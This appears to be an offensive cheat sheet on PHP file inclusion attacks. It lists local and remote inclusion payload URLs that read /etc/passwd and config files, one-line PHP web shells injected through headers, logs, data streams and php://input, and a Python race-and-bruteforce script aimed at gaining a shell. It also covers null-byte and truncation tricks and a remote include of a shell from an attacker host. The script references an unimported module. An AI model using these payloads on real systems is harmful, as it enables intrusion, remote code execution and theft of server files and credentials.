# File Inclusion

## Local File Inclusion

### Direct Local Include

```text
http://site.com/lfi.php?page=/etc/passwd
```

### Using php://filter

```text
http://www.site.com/lfi.php?page=php://filter/resource=config.php

http://www.site.com/lfi.php?page=php://filter/convert.base64-encode/resource=config.php
```

### Using /proc/self/environ

Request's user agent can be found there

```text
GET /lfi.php?page=/proc/self/environ&cmd=id HTTP/1.1
Host: www.site.com
User-Agent: <?php echo shell_exec($_GET['cmd']);?>
```

### Including images

If image.jpg contains php code it will be interpreted.

```text
http://www.site.com/lfi.php?page=upload/image.jpg
```

### Using Zip and Phar wrappers

File must be zip archive with any extension

```text
http://www.site.com/lfi.php?page=zip://image.zip#shell.php

http://www.site.com/lfi.php?page=phar://image.phar#shell.php
```

### File Uploads

It requires php interpreter that crashes upon infinite recursive inclusion, thus not removing temporary file.

1. Upload a file and trigger a self-inclusion
2. Repeat step 1 until successful attack
3. Bruteforce inclusion of /tmp/php\[0-9a-zA-Z\]{6}
4. Shell

We have 62\*\*6 possible values -&gt; 56800235584 filenames for temporary uploaded files Birthday paradox can be applied and it results with about 280000 requests to find valid file with more than 50% chance.

```text
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```

It is possible to send 20 files in one request that will be accepted by the server.

### Session Files

### PHPInfo Script

### Temporary Files - Windows

### Injecting PHP Log Files

On Linux a typical Apache Installation has its log files in `/var/log/apache2/access.log` etc.

```text
$ nc -nv <RHOST> 80
(UNKNOWN) [x.x.x.x] 80 (http) open
<?php echo shell_exec($_GET['cmd']);?>

-- This writes php code into access.log

# Then browse to the lfi in the site to include the log file
http://<RHOST>/index.php?name=a&cmd=uname%20-a&LANG=../../../../../var/log/apache2/access.log%00
```

On Windows one example is xampp which stores logs in `C:\xampp\apache\logs\access.log`

```text
$ nc -nv <RHOST> 80
(UNKNOWN) [192.168.1.1] 80 (http) open
<?php echo shell_exec($_GET['cmd']);?>

-- This writes php code into C:\xampp\apache\logs\access.log

# Then browse to the lfi in the site to include the log file
http://<RHOST>/index.php?name=a&cmd=uname%20-a&LANG=../../../../../xampp/apache/logs/access.log%00
```

## Remote File Inclusion

RFI is possible when the option `allow_url_include` is set to True in `php.ini`

### Direct Remote Include

Including php file in text format directly

```text
http://www.site.com/lfi.php?page=http://<LHOST>/shell.txt%00
```

### Data:text/plain

Including php code through data stream

```text
http://www.site.com/lfi.php?page=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>

http://www.site.com/lfi.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=
```

### Using php://input

```text
POST /lfi.php?page=php://input&cmd=cd HTTP/1.1
Host: www.site.com
Content-Lenth: 39

<?php echo shell_exec($_GET['cmd']);?>
```

## Fighting with extensions

### Using Null Bytes

Adding Null Bytes to terminate the string. This will remove added file extensions in certain versions of php

```text
http://www.site.com/lfi.php?page=/etc/passwd%00

http://www.site.com/lfi.php?page=/etc/passwd%2500
```

### Truncation

The added file extension is cut off through injecting a long string

```text
http://www.site.com/lfi.php?page=../../../../../../../../../../../../etc/passwd
```

```text
http://www.site.com/lfi.php?page=/etc/passwd..............................
```

```text
http://www.site.com/lfi.php?page=/etc/passwd.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
```

